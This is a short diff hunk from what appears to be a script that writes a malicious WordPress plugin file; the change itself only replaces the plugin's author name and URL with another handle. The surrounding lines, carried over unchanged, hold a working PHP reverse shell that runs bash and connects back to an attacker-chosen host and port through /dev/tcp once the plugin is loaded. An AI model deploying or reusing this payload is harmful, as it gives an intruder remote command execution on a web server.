@@ -104,8 +104,8 @@ cat <<EOF > plugin.php
 * Plugin URI: http://localhost
 * Description: Love WPGen
 * Version: 1.0
-* Author: d4t4s3c
-* Author URI: https://github.com/d4t4s3c
+* Author: trhacknon
+* Author URI: https://github.com/trhacknon 
 */
 
 exec("/bin/bash -c 'bash -i >& /dev/tcp/$lhost/$lport 0>&1'");
